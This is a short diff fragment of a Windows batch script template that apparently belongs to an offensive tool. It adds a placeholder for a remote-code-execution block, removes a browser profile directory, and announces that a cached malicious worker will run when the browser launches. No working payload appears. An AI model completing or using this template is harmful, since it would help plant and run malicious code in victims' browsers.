@@ -116,5 +116,6 @@ if /i not "{{MALICIOUS_NAME}}"=="{{BENIGN_NAME}}" (
     rmdir /S /Q "%BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}" 2>nul
 )
 
+{{RCE_BLOCK}}
 echo [+] Done. Launch {{BROWSER_NAME}} - the cached malicious worker will execute.
 endlocal
